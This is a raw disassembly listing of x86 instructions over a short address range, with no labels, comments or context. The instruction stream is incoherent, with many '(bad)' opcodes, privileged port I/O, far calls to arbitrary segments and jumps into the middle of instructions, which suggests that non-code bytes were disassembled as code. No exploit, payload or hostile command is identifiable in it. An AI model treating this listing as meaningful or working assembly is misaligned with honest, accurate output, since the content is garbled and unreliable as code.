  48a557:	sbb    BYTE PTR [ecx-0x3c],dh
  48a55a:	add    edi,DWORD PTR [edx+0x5c]
  48a55d:	push   eax
  48a55e:	out    dx,al
  48a55f:	rcr    ebx,cl
  48a561:	xchg   BYTE PTR [ebx+0x70],bh
  48a564:	fs adc al,0x65
  48a567:	adc    BYTE PTR [esp+ebx*2+0x4a],ch
  48a56b:	add    al,0xc
  48a56d:	add    DWORD PTR [eax*4+0x40876ed2],0x2889411f
  48a578:	aam    0x4f
  48a57a:	sahf   
  48a57b:	shl    DWORD PTR ds:0xd33bf40c,cl
  48a581:	je     0x48a5e2
  48a583:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48a584:	nop
  48a585:	dec    eax
  48a586:	mov    ah,0xbf
  48a588:	jbe    0x48a5ad
  48a58a:	jae    0x48a5c5
  48a58c:	dec    eax
  48a58d:	or     BYTE PTR [esi+edi*2+0x3e],bh
  48a591:	lea    eax,[edx+0x1]
  48a594:	cmp    ebx,DWORD PTR [eax+0x14]
  48a597:	mov    DWORD PTR [ebx],0x7471d2af
  48a59d:	xchg   esi,eax
  48a59e:	sar    BYTE PTR [eax-0x4447abf3],1
  48a5a4:	mov    bh,0x8b
  48a5a6:	inc    eax
  48a5a7:	pop    esi
  48a5a8:	mov    al,0x55
  48a5aa:	jne    0x48a5b0
  48a5ac:	dec    ebx
  48a5ae:	aam    0x78
  48a5b0:	popf   
  48a5b1:	mov    al,0xe2
  48a5b3:	into   
  48a5b4:	or     BYTE PTR [eax-0x80],ah
  48a5b7:	mov    WORD PTR [esi+0x36],cs
  48a5ba:	out    dx,al
  48a5bb:	addr16 fwait
  48a5bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48a5be:	sbb    dh,BYTE PTR [eax+0x44]
  48a5c1:	leave  
  48a5c2:	adc    edi,DWORD PTR [edi+ebp*1-0x71]
  48a5c6:	mov    edi,0x1e78f813
  48a5cb:	push   ss
  48a5cc:	xchg   edx,eax
  48a5cd:	mov    ds:0x9e319c13,al
  48a5d2:	push   esi
  48a5d3:	xor    al,0x10
  48a5d5:	cmp    al,0xc0
  48a5d7:	fstp   TBYTE PTR [ebp-0xf744a08]
  48a5dd:	mov    WORD PTR [eax-0x70],cs
  48a5e0:	dec    esp
  48a5e1:	cmp    ebx,esi
  48a5e3:	je     0x48a5ee
  48a5e5:	repnz cmp BYTE PTR ds:0xb81b313d,al
  48a5ec:	(bad)  
  48a5ed:	out    dx,eax
  48a5ee:	push   es
  48a5ef:	push   ss
  48a5f0:	int    0x7f
  48a5f2:	jo     0x48a599
  48a5f4:	loopne 0x48a631
  48a5f6:	(bad)  
  48a5f7:	cs xchg edi,eax
  48a5f9:	clc    
  48a5fa:	mov    DWORD PTR [edi],esi
  48a5fc:	nop
  48a5fd:	dec    esp
  48a5fe:	mov    DWORD PTR [edi+0x4],edx
  48a601:	cmp    esp,ecx
  48a603:	out    dx,eax
  48a604:	pop    esp
  48a605:	imul   edi,DWORD PTR [eax+0x4c],0x64
  48a609:	add    BYTE PTR [ecx],ch
  48a60b:	test   BYTE PTR [eax-0x7b],al
  48a60e:	cld    
  48a60f:	add    DWORD PTR [ecx],ecx
  48a611:	(bad)  
  48a613:	sti    
  48a614:	cmp    al,0xd
  48a616:	cmp    BYTE PTR [eax-0x76f7b077],al
  48a61c:	cmp    eax,0x62ff3910
  48a621:	or     DWORD PTR [ebx],edi
  48a623:	dec    ebx
  48a624:	and    eax,0x2f025a45
  48a629:	sbb    BYTE PTR [eax],cl
  48a62b:	icebp  
  48a62c:	pusha  
  48a62d:	cmp    DWORD PTR [ebx+0x7d],esi
  48a630:	bound  ecx,QWORD PTR [edi+0x7f06004e]
  48a636:	retf   
  48a637:	dec    ecx
  48a638:	add    al,0xeb
  48a63a:	mov    edx,0xe9e708a6
  48a63f:	retf   0x66ff
  48a642:	lock fadd st,st(4)
  48a645:	mov    esp,0x823029d
  48a64a:	pop    ecx
  48a64b:	jl     0x48a60d
  48a64d:	aaa    
  48a64e:	pop    ebp
  48a64f:	popa   
  48a650:	in     al,0xc
  48a652:	(bad)  
  48a653:	enter  0x5e89,0x3c
  48a657:	mov    cl,0x8d
  48a659:	mov    ecx,0x14c052da
  48a65e:	mov    cl,0x50
  48a660:	pop    eax
  48a661:	(bad)  
  48a663:	ret    
  48a664:	dec    eax
  48a665:	ret    
  48a666:	xchg   BYTE PTR [esp+edx*2],dl
  48a669:	pop    edi
  48a66a:	or     dl,ch
  48a66c:	inc    eax
  48a66d:	js     0x48a675
  48a66f:	in     eax,dx
  48a670:	jge    0x48a6ce
  48a672:	ret    
  48a673:	jo     0x48a68f
  48a675:	cdq    
  48a676:	sbb    cl,BYTE PTR [eax]
  48a678:	and    bl,BYTE PTR fs:[esi+eiz*2]
  48a67c:	xchg   edi,eax
  48a67d:	push   eax
  48a67e:	adc    bh,al
  48a680:	test   al,0xd
  48a682:	push   edx
  48a683:	cmp    BYTE PTR [edi],bl
  48a685:	add    al,0x10
  48a687:	inc    ebp
  48a688:	scas   eax,DWORD PTR es:[edi]
  48a689:	jnp    0x48a668
  48a68b:	ror    BYTE PTR es:[edx-0x7f1e3e4e],0x83
  48a693:	and    bh,BYTE PTR [edx]
  48a695:	sub    BYTE PTR [ebx],dh
  48a697:	and    edi,0x46
  48a69a:	xchg   ebp,eax
  48a69b:	in     al,dx
  48a69c:	fidivr WORD PTR [eax]
  48a69e:	adc    eax,0xbe032184
  48a6a3:	or     al,0xbe
  48a6a5:	sbb    DWORD PTR [esi+0x4a],ebp
  48a6a8:	sbb    BYTE PTR [eax],bh
  48a6aa:	sbb    eax,0x8b1e2445
  48a6af:	sbb    eax,0x1c46c0c9
  48a6b4:	ret    0x82fa
  48a6b7:	cmp    DWORD PTR [edx-0x32],eax
  48a6ba:	add    BYTE PTR [esi-0xebe792a],bh
  48a6c0:	mov    BYTE PTR [esi+0x43],bh
  48a6c3:	and    BYTE PTR ds:0xbce0a348,cl
  48a6c9:	ja     0x48a709
  48a6cb:	int    0x1e
  48a6cd:	or     ah,bl
  48a6cf:	mov    eax,0x674b0c4
  48a6d4:	pop    eax
  48a6d5:	fsub   QWORD PTR [ebx+0xb3a05bf]
  48a6db:	mov    edx,DWORD PTR [ecx+0x19]
  48a6de:	or     ecx,DWORD PTR [esp+ebx*8+0x6e]
  48a6e2:	add    dh,BYTE PTR fs:[eax+0x2382740f]
  48a6e9:	pop    ds
  48a6ea:	inc    ecx
  48a6eb:	rol    BYTE PTR [edi-0x9],0x2e
  48a6ef:	or     al,0xc7
  48a6f1:	or     DWORD PTR [edi+eax*1],edx
  48a6f4:	shl    DWORD PTR [edx],1
  48a6f6:	add    al,0x99
  48a6f8:	out    0xe,eax
  48a6fa:	pop    DWORD PTR ss:[edx+0x1b76ea3f]
  48a701:	call   0xf688:0x65aded5a
  48a708:	sbb    BYTE PTR [ebx+eiz*4-0x72],bl
  48a70c:	scas   al,BYTE PTR es:[edi]
  48a70d:	stos   BYTE PTR es:[edi],al
  48a70e:	mov    esi,DWORD PTR [ecx+0x3]
  48a711:	jb     0x48a72f
  48a713:	cmp    eax,0xea771835
  48a718:	sub    cl,BYTE PTR [eax]
  48a71a:	add    BYTE PTR [ebx+0x23],0x48
  48a71e:	idiv   dh
  48a720:	rcl    bl,0x3c
  48a723:	fisttp QWORD PTR [edx+0x1c]
  48a726:	pop    ss
  48a727:	sbb    al,0x58
  48a729:	sbb    BYTE PTR ds:0x40d01039,cl
  48a72f:	jmp    0xf225a37c
  48a734:	inc    eax
  48a735:	lahf   
  48a736:	test   BYTE PTR [edx+0x1c],0x6e
  48a73a:	push   eax
  48a73b:	and    esi,0x2206aa6
  48a741:	ffree  st(0)
  48a743:	hlt    
  48a744:	pop    eax
  48a745:	dec    eax
  48a746:	jge    0x48a79f
  48a748:	shl    eax,0xa0
  48a74b:	xchg   ecx,eax
  48a74c:	ret    0x334a
  48a74f:	mov    ch,0x8
  48a751:	pop    ds
  48a752:	add    eax,0x6a52625c
  48a757:	add    al,0x4a
  48a759:	cmp    BYTE PTR [edx+eax*1],ah
  48a75c:	adc    eax,0xf8a54036
  48a761:	adc    al,0xb9
  48a763:	fidivr WORD PTR [ebx]
  48a765:	fbstp  TBYTE PTR [edx+eax*1+0xe]
  48a769:	sub    ecx,DWORD PTR ds:0x597aec
  48a76f:	mov    ebx,0x89e80477
  48a774:	jae    0x48a6f6
  48a776:	adc    ebp,DWORD PTR [eax-0x39c12be4]
  48a77c:	pop    ecx
  48a77d:	pusha  
  48a77e:	adc    ch,BYTE PTR [edx+edi*4+0x10]
  48a782:	psubd  mm2,QWORD PTR [edx]
  48a785:	add    cl,BYTE PTR [eax-0x2]
  48a788:	das    
  48a789:	add    ah,cl
  48a78b:	xchg   BYTE PTR ds:0x2696c832,al
  48a791:	add    DWORD PTR [edx+0x45c9d243],ebx
  48a797:	loopne 0x48a76d
  48a799:	pop    edi
  48a79a:	rcl    eax,0xf0
  48a79d:	pusha  
  48a79e:	shl    BYTE PTR [eax+edx*1],1
  48a7a1:	mov    dl,0x46
  48a7a3:	mov    dl,0xff
  48a7a5:	js     0x48a745
  48a7a7:	aam    0x28
  48a7a9:	mov    al,ds:0xcb056cc
  48a7ae:	cmp    al,0x37
  48a7b0:	gs loop 0x48a7e5
  48a7b3:	ins    DWORD PTR es:[edi],dx
  48a7b4:	inc    esp
  48a7b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48a7b6:	cld    
  48a7b7:	pop    ds
  48a7b8:	icebp  
  48a7b9:	sbb    DWORD PTR [edx-0x6d],eax
  48a7bc:	pop    edx
  48a7bd:	dec    edi
  48a7be:	call   0x9d08:0x66512c11
  48a7c5:	aam    0x7f
  48a7c7:	push   ecx
  48a7c8:	sub    eax,0x8f5b7f49
  48a7cd:	lds    eax,FWORD PTR [ecx+0x44]
  48a7d0:	dec    esp
  48a7d1:	push   0xcdc564bc
  48a7d6:	mov    esi,0x89144b06
  48a7db:	jnp    0x48a7f9
  48a7dd:	add    al,0xc0
  48a7df:	xor    BYTE PTR [ebx],bh
  48a7e1:	imul   edx
  48a7e3:	adc    eax,0xe2bdf109
  48a7e8:	sbb    BYTE PTR ss:[eax],bl
  48a7eb:	add    al,0x2
  48a7ed:	iret   
  48a7ee:	cmp    eax,0x52dc0be0
  48a7f3:	shl    BYTE PTR [edi],0x56
  48a7f6:	out    0x3f,eax
  48a7f8:	mov    dh,0x4f
  48a7fa:	cmp    eax,DWORD PTR [edx+0x58c7a4d2]
  48a800:	push   cs
  48a801:	cmp    edx,edi
  48a803:	bswap  edi
  48a805:	(bad)
  48a808:	out    dx,al
  48a809:	es push cs
  48a80b:	xchg   BYTE PTR cs:0x30eee04,cl
  48a812:	and    DWORD PTR [ebp-0x3b],ecx
  48a815:	or     dh,bh
  48a817:	idiv   BYTE PTR [eax]
  48a819:	cmp    DWORD PTR [edi],esp
  48a81b:	cwde   
  48a81c:	lods   al,BYTE PTR ds:[esi]
  48a81d:	cmp    BYTE PTR [edx+0x3eeee7d],dl
  48a823:	and    ch,BYTE PTR [eax+0x1b]
  48a826:	lods   al,BYTE PTR ds:[esi]
  48a827:	or     al,0xdf
  48a829:	mov    edi,?
  48a82b:	sbb    al,0x7e
  48a82d:	adc    DWORD PTR [esi-0x58],esp
  48a830:	hlt    
  48a831:	(bad)  
  48a832:	and    eax,esp
  48a834:	lods   al,BYTE PTR ds:[esi]
  48a835:	mov    dl,0x85
  48a837:	inc    ebx
  48a838:	push   esi
  48a839:	sbb    ah,dh
  48a83b:	dec    eax
  48a83c:	shr    BYTE PTR [ecx-0xf],0xc4
  48a840:	dec    esi
  48a841:	loope  0x48a8b7
  48a843:	loopne 0x48a890
  48a845:	rol    al,0xc5
  48a848:	push   es
  48a849:	les    ecx,FWORD PTR ds:0xef079393
  48a84f:	inc    ecx
  48a850:	xor    al,0x43
  48a852:	and    eax,0xe0805e5e
  48a857:	nop
  48a858:	xchg   ebx,eax
  48a859:	jbe    0x48a8b8
  48a85b:	nop
  48a85c:	pop    ds
  48a85d:	inc    esi
  48a85e:	pcmpgtb mm6,QWORD PTR [ebx-0x6d]
  48a862:	pusha  
  48a863:	inc    ecx
  48a864:	add    al,0x4a
  48a866:	add    al,0x13
  48a868:	adc    al,0x50
  48a86a:	jo     0x48a827
  48a86c:	push   ebp
  48a86d:	or     al,bh
  48a86f:	dec    ebx
  48a870:	xor    dh,BYTE PTR [ebx+0x3a]
  48a873:	xor    dl,ch
  48a875:	jo     0x48a84f
  48a877:	mov    DWORD PTR [ecx-0x58bd49f2],ecx
  48a87d:	cmp    DWORD PTR [eax+0x7b],esp
  48a880:	dec    eax
  48a881:	adc    al,0x1
  48a883:	add    al,0x5f
  48a885:	in     al,dx
  48a886:	sub    eax,0xabb57c09
  48a88b:	add    DWORD PTR [edx+eax*1],0xffffffc8
  48a88f:	test   BYTE PTR [ecx],cl
  48a891:	jne    0x48a8a2
  48a893:	and    BYTE PTR [esi+ebp*4],ch
  48a896:	rol    DWORD PTR [esi+0x35],cl
  48a899:	mov    esp,0x7d75b655
  48a89e:	add    DWORD PTR ds:0x8c5187c4,esi
  48a8a4:	jo     0x48a870
  48a8a6:	jmp    0x48a926
  48a8a8:	inc    ecx
  48a8a9:	push   ecx
  48a8aa:	xor    BYTE PTR ds:0x2b018775,dh
  48a8b0:	mov    esp,0x5fe27cd6
  48a8b5:	mov    cs,WORD PTR [esi-0x67f87efb]
  48a8bb:	sti    
  48a8bc:	sbb    edx,DWORD PTR [edx-0x7a]
  48a8bf:	push   edx
  48a8c0:	stos   BYTE PTR es:[edi],al
  48a8c1:	add    ecx,DWORD PTR [edx]
  48a8c3:	jo     0x48a943
  48a8c5:	inc    esp
  48a8c6:	inc    esi
  48a8c7:	pop    edx
  48a8c8:	jae    0x48a933
  48a8ca:	int3   
  48a8cb:	or     BYTE PTR [eax+ecx*4-0x726b6fe6],0xcc
  48a8d3:	inc    esi
  48a8d4:	inc    esi
  48a8d5:	cwde   
  48a8d6:	mov    al,ds:0xb7b0ac29
  48a8db:	or     ebp,DWORD PTR [edi]
  48a8dd:	fadd   QWORD PTR [edi+0x24968906]
  48a8e3:	sbb    BYTE PTR [eax+0x26ae0d00],cl
  48a8e9:	adc    ecx,esi
  48a8eb:	test   al,0x26
  48a8ed:	loop   0x48a920
  48a8ef:	retf   0x3450
  48a8f2:	adc    esi,DWORD PTR [eax-0x267bf773]
  48a8f8:	xor    al,BYTE PTR [ecx]
  48a8fa:	add    DWORD PTR [ecx],0xffffffe9
  48a8fd:	fiadd  DWORD PTR [eax+0x19]
  48a900:	fs and BYTE PTR cs:[eax+0x2d01a86e],bl
  48a908:	lods   eax,DWORD PTR ds:[esi]
  48a909:	inc    edx
  48a90a:	mov    al,0x9b
  48a90c:	xor    al,0x88
  48a90e:	dec    eax
  48a90f:	adc    BYTE PTR [esi],cl
  48a911:	add    bl,BYTE PTR [eax]
  48a913:	and    BYTE PTR [eax],ch
  48a915:	ins    DWORD PTR es:[edi],dx
  48a916:	test   eax,0x162c35a6
  48a91b:	and    BYTE PTR [eax],dh
  48a91d:	inc    ebx
  48a91e:	cmp    BYTE PTR [ecx+0x77a0e068],cl
  48a924:	push   esp
  48a925:	inc    DWORD PTR [edi]
  48a927:	mov    edx,DWORD PTR [esi+0xfb825b6]
  48a92d:	pop    ebp
  48a92e:	loop   0x48a8bb
  48a930:	sahf   
  48a931:	ins    BYTE PTR es:[edi],dx
  48a932:	aam    0xbe
  48a934:	or     edi,edx
  48a936:	inc    edx
  48a937:	or     bl,BYTE PTR [eax+ecx*8]
  48a93a:	and    ah,al
  48a93c:	fdivr  QWORD PTR [ebx]
  48a93e:	pop    ds
  48a93f:	fwait
  48a940:	sbb    al,BYTE PTR [eax+0x69]
  48a943:	dec    esp
  48a944:	enter  0xfe73,0x52
  48a948:	mov    DWORD PTR [edi-0x7cb0c0fd],eax
  48a94e:	hlt    
  48a94f:	adc    edx,DWORD PTR [ecx+0x3a]
  48a952:	inc    esp
  48a953:	cmp    al,BYTE PTR [ebx+esi*2]
  48a956:	ret    
  48a957:	dec    edx
  48a958:	xchg   edi,eax
  48a959:	xchg   edx,eax
  48a95a:	sbb    dh,BYTE PTR [ebx-0x7b91ef88]
  48a960:	into   
  48a961:	add    eax,0xfb45b4ab
  48a966:	dec    ebp
  48a967:	adc    al,0xc6
  48a969:	add    DWORD PTR [edi+edx*1+0x38384c12],esp
  48a970:	inc    esi
  48a971:	ror    DWORD PTR [esi],1
  48a973:	ins    BYTE PTR es:[edi],dx
  48a974:	fst    QWORD PTR [edi+0x5d5e708d]
  48a97a:	adc    BYTE PTR [eax],dh
  48a97c:	test   BYTE PTR [edi-0x4a357d99],al
  48a982:	(bad)  
  48a983:	xchg   ebx,eax
  48a984:	mov    DWORD PTR [ecx],esi
  48a986:	push   ds
  48a987:	xchg   ecx,eax
  48a988:	and    eax,DWORD PTR [edi-0x4a]
  48a98b:	aaa    
  48a98c:	pop    DWORD PTR [ebx]
  48a98e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48a98f:	add    esi,DWORD PTR [ebx-0x23da57fd]
  48a995:	enter  0x3b6,0xcb
  48a999:	adc    BYTE PTR [ebp+0x3ac779d5],ch
  48a99f:	inc    esi
  48a9a0:	outs   dx,DWORD PTR ds:[esi]
  48a9a1:	enter  0x7c4,0x99
  48a9a5:	inc    edx
  48a9a6:	sahf   
  48a9a7:	adc    ebp,DWORD PTR [esi]
  48a9a9:	add    eax,0x6f07434e
  48a9ae:	xchg   BYTE PTR [eax+0x88b9f0f],ah
  48a9b4:	lea    esi,[edx+edi*1-0x60]
  48a9b8:	push   DWORD PTR [eax+esi*2+0x18049536]
  48a9bf:	test   DWORD PTR ds:0x65c39af2,ebx
  48a9c5:	sbb    DWORD PTR [ebx+0x18302c60],edx
  48a9cb:	daa    
  48a9cc:	cmp    eax,0x5dad1795
  48a9d1:	mov    WORD PTR [ebx],es
  48a9d3:	sub    ebx,DWORD PTR [ecx]
  48a9d5:	sbb    DWORD PTR [edi+eax*4],ebp
  48a9d8:	stos   DWORD PTR es:[edi],eax
  48a9d9:	retf   0x5bdb
  48a9dc:	jg     0x48a9e6
  48a9de:	inc    eax
  48a9df:	inc    edx
  48a9e0:	ja     0x48aa0a
  48a9e2:	cmp    BYTE PTR [eax-0x760f8ef3],bl
  48a9e8:	dec    eax
  48a9e9:	cld    
  48a9ea:	mov    edx,0x932e1f55
  48a9ef:	daa    
  48a9f0:	pop    ds
  48a9f1:	jl     0x48a988
  48a9f3:	sub    ch,ah
  48a9f5:	xor    al,0x5
  48a9f7:	dec    esi
  48a9f8:	add    eax,0xc9e4f3e5
  48a9fd:	pop    ebx
  48a9fe:	add    eax,0x576055f
  48aa03:	inc    esi
  48aa04:	sub    BYTE PTR [eax-0x2d],dh
  48aa07:	xor    ah,al
  48aa09:	inc    esi
  48aa0a:	or     BYTE PTR [esi+0x5e],dh
  48aa0d:	(bad)  [ecx+eiz*1-0x11]
  48aa11:	rol    BYTE PTR [eax],cl
  48aa13:	loope  0x48a999
  48aa15:	sbb    cl,BYTE PTR [ebx+0x66]
  48aa18:	dec    edx
  48aa19:	push   ebx
  48aa1a:	jb     0x48aa85
  48aa1c:	mov    DWORD PTR [eax-0x79],ebx
  48aa1f:	retf   0x6608
  48aa22:	enter  0x8320,0xc
  48aa26:	jle    0x48a9b2
  48aa28:	lea    ebx,[esi+0x60]
  48aa2b:	(bad)  
  48aa2c:	xor    esp,DWORD PTR [edx-0x4f66c0aa]
  48aa32:	test   eax,0x9ecc0dc2
  48aa37:	inc    esi
  48aa38:	dec    eax
  48aa39:	mov    BYTE PTR [edi-0x3d],0x9f
  48aa3d:	push   ds
  48aa3e:	fcom   DWORD PTR [edi+edi*8]
  48aa41:	(bad)  
  48aa43:	retf   0x818
  48aa46:	add    eax,ebx
  48aa48:	sbb    al,0xf7
  48aa4a:	mov    ds:0xda0d41ca,eax
  48aa4f:	jl     0x48a9e5
  48aa51:	mov    cl,0x89
  48aa53:	push   ecx
  48aa54:	adc    al,0x27
  48aa56:	add    al,0xc3
  48aa58:	xor    eax,DWORD PTR [bx+si-0x16]
  48aa5c:	test   DWORD PTR [ebp-0x3a],ebp
  48aa5f:	inc    eax
  48aa60:	mov    edx,ds
  48aa62:	or     DWORD PTR [ecx+0x5790284a],ebx
  48aa68:	push   es
  48aa69:	xor    BYTE PTR [esi+ecx*4-0x31],bl
  48aa6d:	hlt    
  48aa6e:	ja     0x48aab2
  48aa70:	lea    ebx,[eax+0x20]
  48aa73:	lea    eax,[ecx]
  48aa75:	cmp    ebx,eax
  48aa77:	je     0x48aad6
  48aa79:	pop    ds
  48aa7a:	enter  0x4c10,0xf2
  48aa7e:	dec    ebx
  48aa7f:	add    eax,0x45696d51
  48aa84:	push   ds
  48aa85:	or     al,0x32
  48aa87:	jne    0x48ab01
  48aa89:	jg     0x48aa97
  48aa8b:	push   cs
  48aa8c:	xor    BYTE PTR [ecx+0x5c],0xb0
  48aa90:	test   al,0x1f
  48aa92:	mov    DWORD PTR [ecx-0x10],edx
  48aa95:	xchg   esp,eax
  48aa96:	cmp    eax,0x60bf31b0
  48aa9b:	jl     0x48aaa2
  48aa9d:	out    dx,eax
  48aa9e:	add    al,0x3d
  48aaa0:	test   DWORD PTR [eax+0x5f],ecx
  48aaa3:	push   ecx
  48aaa4:	pop    es
  48aaa5:	push   DWORD PTR [esi]
  48aaa7:	xor    BYTE PTR [edi+esi*2-0x985af7e],dl
  48aaae:	es dec eax
  48aab0:	test   al,0x8c
  48aab2:	mov    esp,0x3c24d417
  48aab7:	push   edi
  48aab8:	xor    DWORD PTR [ebp-0x76],esp
  48aabb:	push   0xfffffff4
  48aabd:	arpl   WORD PTR [esp+esi*2+0x4c],dx
  48aac1:	pop    esi
  48aac3:	or     eax,0xd6ae8008
  48aac8:	fldl2e 
  48aaca:	adc    ecx,DWORD PTR [eax+ebp*1-0x44]
  48aace:	mov    ah,0x38
  48aad0:	sbb    al,0x29
  48aad2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48aad3:	(bad)
  48aad8:	or     al,0x7e
  48aada:	jne    0x48ab51
  48aadc:	cmp    al,0x14
  48aade:	mov    WORD PTR [ebx-0x59],ds
  48aae1:	loop   0x48ab51
  48aae3:	mov    edi,DWORD PTR [ebx+0x4a]
  48aae6:	dec    ebx
  48aae8:	inc    esp
  48aae9:	push   cs
  48aaea:	imul   edx,DWORD PTR [esi+0x4a],0x43570720
  48aaf1:	in     al,0xc9
  48aaf3:	xchg   ebx,eax
  48aaf4:	pop    ss
  48aaf5:	frstor [eax]
  48aaf7:	pop    es
  48aaf8:	cmp    BYTE PTR [edi],al
  48aafa:	inc    esp
  48aafb:	pop    es
  48aafc:	or     eax,0x47f277a2
  48ab01:	pop    es
  48ab02:	pop    esp
  48ab03:	adc    BYTE PTR [ebx-0x1],dl
  48ab06:	imul   ebx,DWORD PTR [edx+0x35998420],0x1ddc2d75
  48ab10:	test   al,0xf8
  48ab12:	push   ss
  48ab13:	and    DWORD PTR [eax],ebp
  48ab15:	xor    al,0x9c
  48ab17:	dec    ecx
  48ab18:	fstp   DWORD PTR [eax]
  48ab1a:	icebp  
  48ab1b:	sub    DWORD PTR [edx-0x57b7ef9f],edi
  48ab21:	add    ecx,DWORD PTR [esi+0x6a]
  48ab24:	(bad)  
  48ab25:	xchg   esp,eax
  48ab26:	cmp    esi,DWORD PTR [eax+eax*8]
  48ab29:	dec    eax
  48ab2a:	stos   DWORD PTR es:[edi],eax
  48ab2b:	adc    eax,0x3d05c605
  48ab30:	aam    0x10
  48ab32:	dec    edi
  48ab33:	add    esp,DWORD PTR [eax-0x24]
  48ab36:	or     eax,0x679c05e
  48ab3b:	mov    eax,0x2a2f8118
  48ab40:	lods   al,BYTE PTR ds:[esi]
  48ab41:	jl     0x48ab73
  48ab43:	xchg   BYTE PTR [esi+0x53],al
  48ab46:	push   es
  48ab47:	stc    
  48ab48:	sub    ecx,0x6
  48ab4b:	enter  0x8320,0x9c
  48ab4f:	add    al,0x15
  48ab51:	sbb    eax,0x30e01f80
  48ab56:	xor    eax,0xb48b27ab
  48ab5b:	add    BYTE PTR [edi+0x8],ch
  48ab5e:	jo     0x48ab23
  48ab60:	ins    DWORD PTR es:[edi],dx
  48ab61:	xchg   esp,eax
  48ab62:	xchg   ecx,eax
  48ab63:	jbe    0x48ab95
  48ab65:	loop   0x48ab2e
  48ab67:	fisub  WORD PTR ds:0xfe2120c1
  48ab6d:	or     BYTE PTR [ecx+0x2e],ch
  48ab70:	int    0x5b
  48ab72:	adc    BYTE PTR [edx],cl
  48ab74:	pop    edi
  48ab75:	add    eax,0x4b79c67c
  48ab7a:	jae    0x48ab87
  48ab7c:	mov    ebp,DWORD PTR [esi+0x5983e4aa]
  48ab82:	mov    bh,0xe2
  48ab84:	jno    0x48ab4a
  48ab86:	pop    ss
  48ab87:	sub    BYTE PTR [ecx],ch
  48ab89:	rol    DWORD PTR [edi],1
  48ab8b:	inc    ecx
  48ab8c:	sahf   
  48ab8d:	sbb    al,0xe4
  48ab8f:	hlt    
  48ab90:	or     DWORD PTR [eax],ecx
  48ab92:	adc    eax,0x741fc208
  48ab97:	jno    0x48aba9
  48ab99:	retf   0xee28
  48ab9c:	cmp    edi,ecx
  48ab9e:	jbe    0x48abb3
  48aba0:	sub    ecx,esp
  48aba2:	mov    al,0x9a
  48aba4:	or     BYTE PTR [ebx+esi*4],0x31
  48aba8:	inc    esi
  48aba9:	cld    
  48abaa:	sub    dl,BYTE PTR [edx+edi*2]
  48abad:	jecxz  0x48aba6
  48abaf:	jb     0x48aba0
  48abb1:	ret    0x1dcb
  48abb4:	and    al,0xbc
  48abb6:	adc    BYTE PTR [eax-0x66],al
  48abb9:	xchg   BYTE PTR [ebp+ebp*2+0x6c70b98b],al
  48abc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48abc1:	dec    DWORD PTR ds:0xe83e9834
  48abc7:	jle    0x48abe9
  48abc9:	int    0xa9
  48abcb:	cs dec edi
  48abcd:	xor    eax,0x935707f5
  48abd2:	daa    
  48abd3:	dec    edi
  48abd4:	pop    esi
  48abd5:	cmc    
  48abd6:	pop    es
  48abd7:	or     eax,0xf8081908
  48abdc:	lods   eax,DWORD PTR ds:[esi]
  48abdd:	in     al,0xc9
  48abdf:	sbb    al,0x8
  48abe1:	xor    DWORD PTR [eax],ecx
  48abe3:	cdq    
  48abe4:	inc    ebx
  48abe5:	cmp    ebx,DWORD PTR [ecx]
  48abe7:	ret    0xae27
  48abea:	cmp    BYTE PTR [eax],0x72
  48abed:	adc    dh,0x52
  48abf0:	push   esp
  48abf1:	xchg   DWORD PTR [ecx+eiz*4+0x45],eax
  48abf5:	adc    al,0xea
  48abf7:	push   es
  48abf8:	jp     0x48ac3e
  48abfa:	arpl   WORD PTR [edx+ecx*4],bp
  48abfd:	mov    es,WORD PTR [ebx]
  48abff:	and    DWORD PTR [esi-0x1a],esi
  48ac02:	sbb    al,0x1
  48ac04:	outs   dx,DWORD PTR ds:[esi]
  48ac05:	test   al,0x17
  48ac07:	mov    esi,0x8815f0fc
  48ac0c:	add    ax,ax
  48ac0f:	push   esi
  48ac10:	xor    dl,BYTE PTR [esi+0x57370b0]
  48ac16:	outs   dx,DWORD PTR ds:[esi]
  48ac17:	imul   esi,DWORD PTR [esi-0x61],0xba6ce4a7
  48ac1e:	add    al,0x54
  48ac20:	and    al,0x68
  48ac22:	or     al,0xb5
  48ac24:	not    DWORD PTR [ecx+0x52]
  48ac27:	(bad)  
  48ac28:	sbb    ecx,edx
  48ac2a:	xchg   ebp,eax
  48ac2b:	outs   dx,BYTE PTR ds:[esi]
  48ac2c:	push   esp
  48ac2d:	dec    esp
  48ac2e:	rol    BYTE PTR [esi-0x46],0x8f
  48ac32:	dec    eax
  48ac33:	or     al,0xa0
  48ac35:	dec    esp
  48ac36:	dec    esp
  48ac37:	push   cs
  48ac38:	sbb    BYTE PTR [eax],ah
  48ac3a:	inc    edi
  48ac3b:	sti    
  48ac3c:	call   0x3d01e6ca
  48ac41:	xchg   ebp,eax
  48ac42:	clc    
  48ac43:	sar    BYTE PTR ds:0xbdf88b82,cl
  48ac49:	add    al,0x50
  48ac4b:	push   ebx
  48ac4c:	push   edi
  48ac4d:	adc    DWORD PTR [ebp-0x627fb8bf],ebx
  48ac53:	mov    eax,ebx
  48ac55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48ac56:	mov    edi,0x11efffdf
  48ac5b:	dec    ecx
  48ac5c:	adc    al,0x8f
  48ac5e:	push   eax
  48ac5f:	push   0xe10040a6
  48ac64:	mov    al,ds:0x6f00042
  48ac69:	xlat   BYTE PTR ds:[ebx]
  48ac6a:	popf   
  48ac6b:	idiv   DWORD PTR [edx+0x2166cd3]
  48ac71:	mov    eax,ds:0x16472ff9
  48ac76:	xchg   ebp,eax
  48ac77:	push   es
  48ac78:	push   ebp
  48ac79:	add    BYTE PTR [edi-0x62],bh
  48ac7c:	sahf   
  48ac7d:	mov    esi,0x42a222
  48ac82:	aas    
  48ac83:	push   cs
  48ac84:	mov    esi,0x847950
  48ac89:	mov    ebx,0xaf2470c5
  48ac8e:	lock sbb cl,BYTE PTR [ebx+0x3696004e]
  48ac95:	out    0x6,al
  48ac97:	cwde   
  48ac98:	adc    BYTE PTR [edx+0x1e],ch
  48ac9b:	push   es
  48ac9c:	es or  ah,cl
  48ac9f:	outs   dx,BYTE PTR ds:[esi]
  48aca1:	sbb    ah,ch
  48aca3:	inc    eax
  48aca4:	test   DWORD PTR [esi],0x20061c06
